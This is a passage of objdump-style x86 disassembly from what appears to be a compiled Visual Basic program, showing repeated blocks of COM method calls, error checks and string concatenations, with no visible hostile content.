  406b1b:	ff 90 08 03 00 00    	call   *0x308(%eax)
  406b21:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406b24:	50                   	push   %eax
  406b25:	51                   	push   %ecx
  406b26:	ff d3                	call   *%ebx
  406b28:	8b 16                	mov    (%esi),%edx
  406b2a:	56                   	push   %esi
  406b2b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406b31:	ff 92 08 03 00 00    	call   *0x308(%edx)
  406b37:	50                   	push   %eax
  406b38:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  406b3b:	50                   	push   %eax
  406b3c:	ff d3                	call   *%ebx
  406b3e:	8b f8                	mov    %eax,%edi
  406b40:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406b43:	52                   	push   %edx
  406b44:	57                   	push   %edi
  406b45:	8b 0f                	mov    (%edi),%ecx
  406b47:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  406b4d:	85 c0                	test   %eax,%eax
  406b4f:	db e2                	fnclex
  406b51:	7d 12                	jge    0x406b65
  406b53:	68 a0 00 00 00       	push   $0xa0
  406b58:	68 84 2a 40 00       	push   $0x402a84
  406b5d:	57                   	push   %edi
  406b5e:	50                   	push   %eax
  406b5f:	ff 15 38 10 40 00    	call   *0x401038
  406b65:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406b68:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  406b6e:	51                   	push   %ecx
  406b6f:	68 64 2d 40 00       	push   $0x402d64
  406b74:	8b 38                	mov    (%eax),%edi
  406b76:	ff 15 30 10 40 00    	call   *0x401030
  406b7c:	8b d0                	mov    %eax,%edx
  406b7e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406b81:	ff 15 f0 10 40 00    	call   *0x4010f0
  406b87:	8b d7                	mov    %edi,%edx
  406b89:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406b8f:	50                   	push   %eax
  406b90:	57                   	push   %edi
  406b91:	e9 5b df ff ff       	jmp    0x404af1
  406b96:	8b 0e                	mov    (%esi),%ecx
  406b98:	56                   	push   %esi
  406b99:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406b9f:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406ba2:	50                   	push   %eax
  406ba3:	52                   	push   %edx
  406ba4:	ff d3                	call   *%ebx
  406ba6:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406bac:	8b 06                	mov    (%esi),%eax
  406bae:	56                   	push   %esi
  406baf:	ff 90 08 03 00 00    	call   *0x308(%eax)
  406bb5:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406bb8:	50                   	push   %eax
  406bb9:	51                   	push   %ecx
  406bba:	ff d3                	call   *%ebx
  406bbc:	8b f8                	mov    %eax,%edi
  406bbe:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406bc1:	50                   	push   %eax
  406bc2:	57                   	push   %edi
  406bc3:	8b 17                	mov    (%edi),%edx
  406bc5:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  406bcb:	85 c0                	test   %eax,%eax
  406bcd:	db e2                	fnclex
  406bcf:	7d 12                	jge    0x406be3
  406bd1:	68 a0 00 00 00       	push   $0xa0
  406bd6:	68 84 2a 40 00       	push   $0x402a84
  406bdb:	57                   	push   %edi
  406bdc:	50                   	push   %eax
  406bdd:	ff 15 38 10 40 00    	call   *0x401038
  406be3:	8b 55 dc             	mov    -0x24(%ebp),%edx
  406be6:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  406bec:	52                   	push   %edx
  406bed:	68 7c 2d 40 00       	push   $0x402d7c
  406bf2:	8b 39                	mov    (%ecx),%edi
  406bf4:	ff 15 30 10 40 00    	call   *0x401030
  406bfa:	8b d0                	mov    %eax,%edx
  406bfc:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406bff:	ff 15 f0 10 40 00    	call   *0x4010f0
  406c05:	89 bd 30 fe ff ff    	mov    %edi,-0x1d0(%ebp)
  406c0b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406c11:	50                   	push   %eax
  406c12:	8b 85 30 fe ff ff    	mov    -0x1d0(%ebp),%eax
  406c18:	57                   	push   %edi
  406c19:	e9 6b df ff ff       	jmp    0x404b89
  406c1e:	8b 16                	mov    (%esi),%edx
  406c20:	56                   	push   %esi
  406c21:	ff 92 08 03 00 00    	call   *0x308(%edx)
  406c27:	50                   	push   %eax
  406c28:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406c2b:	50                   	push   %eax
  406c2c:	ff d3                	call   *%ebx
  406c2e:	8b 0e                	mov    (%esi),%ecx
  406c30:	56                   	push   %esi
  406c31:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406c37:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406c3d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406c40:	50                   	push   %eax
  406c41:	52                   	push   %edx
  406c42:	ff d3                	call   *%ebx
  406c44:	8b f8                	mov    %eax,%edi
  406c46:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406c49:	51                   	push   %ecx
  406c4a:	57                   	push   %edi
  406c4b:	8b 07                	mov    (%edi),%eax
  406c4d:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  406c53:	85 c0                	test   %eax,%eax
  406c55:	db e2                	fnclex
  406c57:	7d 12                	jge    0x406c6b
  406c59:	68 a0 00 00 00       	push   $0xa0
  406c5e:	68 84 2a 40 00       	push   $0x402a84
  406c63:	57                   	push   %edi
  406c64:	50                   	push   %eax
  406c65:	ff 15 38 10 40 00    	call   *0x401038
  406c6b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406c6e:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  406c74:	50                   	push   %eax
  406c75:	68 94 2d 40 00       	push   $0x402d94
  406c7a:	8b 3a                	mov    (%edx),%edi
  406c7c:	ff 15 30 10 40 00    	call   *0x401030
  406c82:	8b d0                	mov    %eax,%edx
  406c84:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406c87:	ff 15 f0 10 40 00    	call   *0x4010f0
  406c8d:	8b cf                	mov    %edi,%ecx
  406c8f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406c95:	50                   	push   %eax
  406c96:	57                   	push   %edi
  406c97:	e9 0b 06 00 00       	jmp    0x4072a7
  406c9c:	8b 06                	mov    (%esi),%eax
  406c9e:	56                   	push   %esi
  406c9f:	ff 90 08 03 00 00    	call   *0x308(%eax)
  406ca5:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406ca8:	50                   	push   %eax
  406ca9:	51                   	push   %ecx
  406caa:	ff d3                	call   *%ebx
  406cac:	8b 16                	mov    (%esi),%edx
  406cae:	56                   	push   %esi
  406caf:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406cb5:	ff 92 08 03 00 00    	call   *0x308(%edx)
  406cbb:	50                   	push   %eax
  406cbc:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  406cbf:	50                   	push   %eax
  406cc0:	ff d3                	call   *%ebx
  406cc2:	8b f8                	mov    %eax,%edi
  406cc4:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406cc7:	52                   	push   %edx
  406cc8:	57                   	push   %edi
  406cc9:	8b 0f                	mov    (%edi),%ecx
  406ccb:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  406cd1:	85 c0                	test   %eax,%eax
  406cd3:	db e2                	fnclex
  406cd5:	7d 12                	jge    0x406ce9
  406cd7:	68 a0 00 00 00       	push   $0xa0
  406cdc:	68 84 2a 40 00       	push   $0x402a84
  406ce1:	57                   	push   %edi
  406ce2:	50                   	push   %eax
  406ce3:	ff 15 38 10 40 00    	call   *0x401038
  406ce9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406cec:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  406cf2:	51                   	push   %ecx
  406cf3:	68 a8 2d 40 00       	push   $0x402da8
  406cf8:	8b 38                	mov    (%eax),%edi
  406cfa:	ff 15 30 10 40 00    	call   *0x401030
  406d00:	8b d0                	mov    %eax,%edx
  406d02:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406d05:	ff 15 f0 10 40 00    	call   *0x4010f0
  406d0b:	8b d7                	mov    %edi,%edx
  406d0d:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406d13:	50                   	push   %eax
  406d14:	57                   	push   %edi
  406d15:	e9 d7 dd ff ff       	jmp    0x404af1
  406d1a:	8b 0e                	mov    (%esi),%ecx
  406d1c:	56                   	push   %esi
  406d1d:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406d23:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406d26:	50                   	push   %eax
  406d27:	52                   	push   %edx
  406d28:	ff d3                	call   *%ebx
  406d2a:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406d30:	8b 06                	mov    (%esi),%eax
  406d32:	56                   	push   %esi
  406d33:	ff 90 08 03 00 00    	call   *0x308(%eax)
  406d39:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406d3c:	50                   	push   %eax
  406d3d:	51                   	push   %ecx
  406d3e:	ff d3                	call   *%ebx
  406d40:	8b f8                	mov    %eax,%edi
  406d42:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406d45:	50                   	push   %eax
  406d46:	57                   	push   %edi
  406d47:	8b 17                	mov    (%edi),%edx
  406d49:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  406d4f:	85 c0                	test   %eax,%eax
  406d51:	db e2                	fnclex
  406d53:	7d 12                	jge    0x406d67
  406d55:	68 a0 00 00 00       	push   $0xa0
  406d5a:	68 84 2a 40 00       	push   $0x402a84
  406d5f:	57                   	push   %edi
  406d60:	50                   	push   %eax
  406d61:	ff 15 38 10 40 00    	call   *0x401038
  406d67:	8b 55 dc             	mov    -0x24(%ebp),%edx
  406d6a:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  406d70:	52                   	push   %edx
  406d71:	68 b0 2d 40 00       	push   $0x402db0
  406d76:	8b 39                	mov    (%ecx),%edi
  406d78:	ff 15 30 10 40 00    	call   *0x401030
  406d7e:	8b d0                	mov    %eax,%edx
  406d80:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406d83:	ff 15 f0 10 40 00    	call   *0x4010f0
  406d89:	89 bd 24 fe ff ff    	mov    %edi,-0x1dc(%ebp)
  406d8f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406d95:	50                   	push   %eax
  406d96:	8b 85 24 fe ff ff    	mov    -0x1dc(%ebp),%eax
  406d9c:	57                   	push   %edi
  406d9d:	e9 e7 dd ff ff       	jmp    0x404b89
  406da2:	8b 16                	mov    (%esi),%edx
  406da4:	56                   	push   %esi
  406da5:	ff 92 08 03 00 00    	call   *0x308(%edx)
  406dab:	50                   	push   %eax
  406dac:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406daf:	50                   	push   %eax
  406db0:	ff d3                	call   *%ebx
  406db2:	8b 0e                	mov    (%esi),%ecx
  406db4:	56                   	push   %esi
  406db5:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406dbb:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406dc1:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406dc4:	50                   	push   %eax
  406dc5:	52                   	push   %edx
  406dc6:	ff d3                	call   *%ebx
  406dc8:	8b f8                	mov    %eax,%edi
  406dca:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406dcd:	51                   	push   %ecx
  406dce:	57                   	push   %edi
  406dcf:	8b 07                	mov    (%edi),%eax
  406dd1:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  406dd7:	85 c0                	test   %eax,%eax
  406dd9:	db e2                	fnclex
  406ddb:	7d 12                	jge    0x406def
  406ddd:	68 a0 00 00 00       	push   $0xa0
  406de2:	68 84 2a 40 00       	push   $0x402a84
  406de7:	57                   	push   %edi
  406de8:	50                   	push   %eax
  406de9:	ff 15 38 10 40 00    	call   *0x401038
  406def:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406df2:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  406df8:	50                   	push   %eax
  406df9:	68 cc 2d 40 00       	push   $0x402dcc
  406dfe:	8b 3a                	mov    (%edx),%edi
  406e00:	ff 15 30 10 40 00    	call   *0x401030
  406e06:	8b d0                	mov    %eax,%edx
  406e08:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406e0b:	ff 15 f0 10 40 00    	call   *0x4010f0
  406e11:	8b cf                	mov    %edi,%ecx
  406e13:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406e19:	50                   	push   %eax
  406e1a:	57                   	push   %edi
  406e1b:	e9 87 04 00 00       	jmp    0x4072a7
  406e20:	8b 06                	mov    (%esi),%eax
  406e22:	56                   	push   %esi
  406e23:	ff 90 08 03 00 00    	call   *0x308(%eax)
  406e29:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406e2c:	50                   	push   %eax
  406e2d:	51                   	push   %ecx
  406e2e:	ff d3                	call   *%ebx
  406e30:	8b 16                	mov    (%esi),%edx
  406e32:	56                   	push   %esi
  406e33:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406e39:	ff 92 08 03 00 00    	call   *0x308(%edx)
  406e3f:	50                   	push   %eax
  406e40:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  406e43:	50                   	push   %eax
  406e44:	ff d3                	call   *%ebx
  406e46:	8b f8                	mov    %eax,%edi
  406e48:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406e4b:	52                   	push   %edx
  406e4c:	57                   	push   %edi
  406e4d:	8b 0f                	mov    (%edi),%ecx
  406e4f:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  406e55:	85 c0                	test   %eax,%eax
  406e57:	db e2                	fnclex
  406e59:	7d 12                	jge    0x406e6d
  406e5b:	68 a0 00 00 00       	push   $0xa0
  406e60:	68 84 2a 40 00       	push   $0x402a84
  406e65:	57                   	push   %edi
  406e66:	50                   	push   %eax
  406e67:	ff 15 38 10 40 00    	call   *0x401038
  406e6d:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406e70:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  406e76:	51                   	push   %ecx
  406e77:	68 ec 2d 40 00       	push   $0x402dec
  406e7c:	8b 38                	mov    (%eax),%edi
  406e7e:	ff 15 30 10 40 00    	call   *0x401030
  406e84:	8b d0                	mov    %eax,%edx
  406e86:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406e89:	ff 15 f0 10 40 00    	call   *0x4010f0
  406e8f:	8b d7                	mov    %edi,%edx
  406e91:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406e97:	50                   	push   %eax
  406e98:	57                   	push   %edi
  406e99:	e9 53 dc ff ff       	jmp    0x404af1
  406e9e:	8b 0e                	mov    (%esi),%ecx
  406ea0:	56                   	push   %esi
  406ea1:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406ea7:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406eaa:	50                   	push   %eax
  406eab:	52                   	push   %edx
  406eac:	ff d3                	call   *%ebx
  406eae:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406eb4:	8b 06                	mov    (%esi),%eax
  406eb6:	56                   	push   %esi
  406eb7:	ff 90 08 03 00 00    	call   *0x308(%eax)
  406ebd:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406ec0:	50                   	push   %eax
  406ec1:	51                   	push   %ecx
  406ec2:	ff d3                	call   *%ebx
  406ec4:	8b f8                	mov    %eax,%edi
  406ec6:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406ec9:	50                   	push   %eax
  406eca:	57                   	push   %edi
  406ecb:	8b 17                	mov    (%edi),%edx
  406ecd:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  406ed3:	85 c0                	test   %eax,%eax
  406ed5:	db e2                	fnclex
  406ed7:	7d 12                	jge    0x406eeb
  406ed9:	68 a0 00 00 00       	push   $0xa0
  406ede:	68 84 2a 40 00       	push   $0x402a84
  406ee3:	57                   	push   %edi
  406ee4:	50                   	push   %eax
  406ee5:	ff 15 38 10 40 00    	call   *0x401038
  406eeb:	8b 55 dc             	mov    -0x24(%ebp),%edx
  406eee:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  406ef4:	52                   	push   %edx
  406ef5:	68 00 2e 40 00       	push   $0x402e00
  406efa:	8b 39                	mov    (%ecx),%edi
  406efc:	ff 15 30 10 40 00    	call   *0x401030
  406f02:	8b d0                	mov    %eax,%edx
  406f04:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406f07:	ff 15 f0 10 40 00    	call   *0x4010f0
  406f0d:	89 bd 18 fe ff ff    	mov    %edi,-0x1e8(%ebp)
  406f13:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406f19:	50                   	push   %eax
  406f1a:	8b 85 18 fe ff ff    	mov    -0x1e8(%ebp),%eax
  406f20:	57                   	push   %edi
  406f21:	e9 63 dc ff ff       	jmp    0x404b89
  406f26:	8b 16                	mov    (%esi),%edx
  406f28:	56                   	push   %esi
  406f29:	ff 92 08 03 00 00    	call   *0x308(%edx)
  406f2f:	50                   	push   %eax
  406f30:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406f33:	50                   	push   %eax
  406f34:	ff d3                	call   *%ebx
  406f36:	8b 0e                	mov    (%esi),%ecx
  406f38:	56                   	push   %esi
  406f39:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406f3f:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406f45:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406f48:	50                   	push   %eax
  406f49:	52                   	push   %edx
  406f4a:	ff d3                	call   *%ebx
  406f4c:	8b f8                	mov    %eax,%edi
  406f4e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406f51:	51                   	push   %ecx
  406f52:	57                   	push   %edi
  406f53:	8b 07                	mov    (%edi),%eax
  406f55:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  406f5b:	85 c0                	test   %eax,%eax
  406f5d:	db e2                	fnclex
  406f5f:	7d 12                	jge    0x406f73
  406f61:	68 a0 00 00 00       	push   $0xa0
  406f66:	68 84 2a 40 00       	push   $0x402a84
  406f6b:	57                   	push   %edi
  406f6c:	50                   	push   %eax
  406f6d:	ff 15 38 10 40 00    	call   *0x401038
  406f73:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406f76:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  406f7c:	50                   	push   %eax
  406f7d:	68 18 2e 40 00       	push   $0x402e18
  406f82:	8b 3a                	mov    (%edx),%edi
  406f84:	ff 15 30 10 40 00    	call   *0x401030
  406f8a:	8b d0                	mov    %eax,%edx
  406f8c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406f8f:	ff 15 f0 10 40 00    	call   *0x4010f0
  406f95:	8b cf                	mov    %edi,%ecx
  406f97:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406f9d:	50                   	push   %eax
  406f9e:	57                   	push   %edi
  406f9f:	e9 03 03 00 00       	jmp    0x4072a7
  406fa4:	8b 06                	mov    (%esi),%eax
  406fa6:	56                   	push   %esi
  406fa7:	ff 90 08 03 00 00    	call   *0x308(%eax)
  406fad:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406fb0:	50                   	push   %eax
  406fb1:	51                   	push   %ecx
  406fb2:	ff d3                	call   *%ebx
  406fb4:	8b 16                	mov    (%esi),%edx
  406fb6:	56                   	push   %esi
  406fb7:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406fbd:	ff 92 08 03 00 00    	call   *0x308(%edx)
  406fc3:	50                   	push   %eax
  406fc4:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  406fc7:	50                   	push   %eax
  406fc8:	ff d3                	call   *%ebx
  406fca:	8b f8                	mov    %eax,%edi
  406fcc:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406fcf:	52                   	push   %edx
  406fd0:	57                   	push   %edi
  406fd1:	8b 0f                	mov    (%edi),%ecx
  406fd3:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  406fd9:	85 c0                	test   %eax,%eax
  406fdb:	db e2                	fnclex
  406fdd:	7d 12                	jge    0x406ff1
  406fdf:	68 a0 00 00 00       	push   $0xa0
  406fe4:	68 84 2a 40 00       	push   $0x402a84
  406fe9:	57                   	push   %edi
  406fea:	50                   	push   %eax
  406feb:	ff 15 38 10 40 00    	call   *0x401038
  406ff1:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406ff4:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  406ffa:	51                   	push   %ecx
  406ffb:	68 30 2e 40 00       	push   $0x402e30
  407000:	8b 38                	mov    (%eax),%edi
  407002:	ff 15 30 10 40 00    	call   *0x401030
  407008:	8b d0                	mov    %eax,%edx
  40700a:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40700d:	ff 15 f0 10 40 00    	call   *0x4010f0
  407013:	8b d7                	mov    %edi,%edx
  407015:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40701b:	50                   	push   %eax
  40701c:	57                   	push   %edi
  40701d:	e9 cf da ff ff       	jmp    0x404af1
  407022:	8b 0e                	mov    (%esi),%ecx
  407024:	56                   	push   %esi
  407025:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  40702b:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40702e:	50                   	push   %eax
  40702f:	52                   	push   %edx
  407030:	ff d3                	call   *%ebx
  407032:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407038:	8b 06                	mov    (%esi),%eax
  40703a:	56                   	push   %esi
  40703b:	ff 90 08 03 00 00    	call   *0x308(%eax)
  407041:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407044:	50                   	push   %eax
  407045:	51                   	push   %ecx
  407046:	ff d3                	call   *%ebx
  407048:	8b f8                	mov    %eax,%edi
  40704a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40704d:	50                   	push   %eax
  40704e:	57                   	push   %edi
  40704f:	8b 17                	mov    (%edi),%edx
  407051:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  407057:	85 c0                	test   %eax,%eax
  407059:	db e2                	fnclex
  40705b:	7d 12                	jge    0x40706f
  40705d:	68 a0 00 00 00       	push   $0xa0
  407062:	68 84 2a 40 00       	push   $0x402a84
  407067:	57                   	push   %edi
  407068:	50                   	push   %eax
  407069:	ff 15 38 10 40 00    	call   *0x401038
  40706f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  407072:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  407078:	52                   	push   %edx
  407079:	68 44 2e 40 00       	push   $0x402e44
  40707e:	8b 39                	mov    (%ecx),%edi
  407080:	ff 15 30 10 40 00    	call   *0x401030
  407086:	8b d0                	mov    %eax,%edx
  407088:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40708b:	ff 15 f0 10 40 00    	call   *0x4010f0
  407091:	89 bd 0c fe ff ff    	mov    %edi,-0x1f4(%ebp)
  407097:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40709d:	50                   	push   %eax
  40709e:	8b 85 0c fe ff ff    	mov    -0x1f4(%ebp),%eax
  4070a4:	57                   	push   %edi
  4070a5:	e9 df da ff ff       	jmp    0x404b89
  4070aa:	8b 16                	mov    (%esi),%edx
  4070ac:	56                   	push   %esi
  4070ad:	ff 92 08 03 00 00    	call   *0x308(%edx)
  4070b3:	50                   	push   %eax
  4070b4:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4070b7:	50                   	push   %eax
  4070b8:	ff d3                	call   *%ebx
  4070ba:	8b 0e                	mov    (%esi),%ecx
  4070bc:	56                   	push   %esi
  4070bd:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4070c3:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  4070c9:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4070cc:	50                   	push   %eax
  4070cd:	52                   	push   %edx
  4070ce:	ff d3                	call   *%ebx
  4070d0:	8b f8                	mov    %eax,%edi
  4070d2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4070d5:	51                   	push   %ecx
  4070d6:	57                   	push   %edi
  4070d7:	8b 07                	mov    (%edi),%eax
  4070d9:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4070df:	85 c0                	test   %eax,%eax
  4070e1:	db e2                	fnclex
  4070e3:	7d 12                	jge    0x4070f7
  4070e5:	68 a0 00 00 00       	push   $0xa0
  4070ea:	68 84 2a 40 00       	push   $0x402a84
  4070ef:	57                   	push   %edi
  4070f0:	50                   	push   %eax
  4070f1:	ff 15 38 10 40 00    	call   *0x401038
  4070f7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4070fa:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  407100:	50                   	push   %eax
  407101:	68 5c 2e 40 00       	push   $0x402e5c
  407106:	8b 3a                	mov    (%edx),%edi
  407108:	ff 15 30 10 40 00    	call   *0x401030
  40710e:	8b d0                	mov    %eax,%edx
  407110:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407113:	ff 15 f0 10 40 00    	call   *0x4010f0
  407119:	8b cf                	mov    %edi,%ecx
  40711b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  407121:	50                   	push   %eax
  407122:	57                   	push   %edi
  407123:	e9 7f 01 00 00       	jmp    0x4072a7
  407128:	8b 06                	mov    (%esi),%eax
  40712a:	56                   	push   %esi
  40712b:	ff 90 08 03 00 00    	call   *0x308(%eax)
  407131:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  407134:	50                   	push   %eax
  407135:	51                   	push   %ecx
  407136:	ff d3                	call   *%ebx
  407138:	8b 16                	mov    (%esi),%edx
  40713a:	56                   	push   %esi
  40713b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407141:	ff 92 08 03 00 00    	call   *0x308(%edx)
  407147:	50                   	push   %eax
  407148:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40714b:	50                   	push   %eax
  40714c:	ff d3                	call   *%ebx
  40714e:	8b f8                	mov    %eax,%edi
  407150:	8d 55 dc             	lea    -0x24(%ebp),%edx
  407153:	52                   	push   %edx
  407154:	57                   	push   %edi
  407155:	8b 0f                	mov    (%edi),%ecx
  407157:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40715d:	85 c0                	test   %eax,%eax
  40715f:	db e2                	fnclex
  407161:	7d 12                	jge    0x407175
  407163:	68 a0 00 00 00       	push   $0xa0
  407168:	68 84 2a 40 00       	push   $0x402a84
  40716d:	57                   	push   %edi
  40716e:	50                   	push   %eax
  40716f:	ff 15 38 10 40 00    	call   *0x401038
  407175:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407178:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  40717e:	51                   	push   %ecx
  40717f:	68 74 2e 40 00       	push   $0x402e74
  407184:	8b 38                	mov    (%eax),%edi
  407186:	ff 15 30 10 40 00    	call   *0x401030
  40718c:	8b d0                	mov    %eax,%edx
  40718e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407191:	ff 15 f0 10 40 00    	call   *0x4010f0
  407197:	8b d7                	mov    %edi,%edx
  407199:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40719f:	50                   	push   %eax
  4071a0:	57                   	push   %edi
  4071a1:	e9 4b d9 ff ff       	jmp    0x404af1
  4071a6:	8b 0e                	mov    (%esi),%ecx
  4071a8:	56                   	push   %esi
  4071a9:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  4071af:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4071b2:	50                   	push   %eax
  4071b3:	52                   	push   %edx
  4071b4:	ff d3                	call   *%ebx
  4071b6:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4071bc:	8b 06                	mov    (%esi),%eax
  4071be:	56                   	push   %esi
  4071bf:	ff 90 08 03 00 00    	call   *0x308(%eax)
  4071c5:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4071c8:	50                   	push   %eax
  4071c9:	51                   	push   %ecx
  4071ca:	ff d3                	call   *%ebx
  4071cc:	8b f8                	mov    %eax,%edi
  4071ce:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4071d1:	50                   	push   %eax
  4071d2:	57                   	push   %edi
  4071d3:	8b 17                	mov    (%edi),%edx
  4071d5:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4071db:	85 c0                	test   %eax,%eax
  4071dd:	db e2                	fnclex
  4071df:	7d 12                	jge    0x4071f3
  4071e1:	68 a0 00 00 00       	push   $0xa0
  4071e6:	68 84 2a 40 00       	push   $0x402a84
  4071eb:	57                   	push   %edi
  4071ec:	50                   	push   %eax
  4071ed:	ff 15 38 10 40 00    	call   *0x401038
  4071f3:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4071f6:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4071fc:	52                   	push   %edx
  4071fd:	68 90 2e 40 00       	push   $0x402e90
  407202:	8b 39                	mov    (%ecx),%edi
  407204:	ff 15 30 10 40 00    	call   *0x401030
  40720a:	8b d0                	mov    %eax,%edx
  40720c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
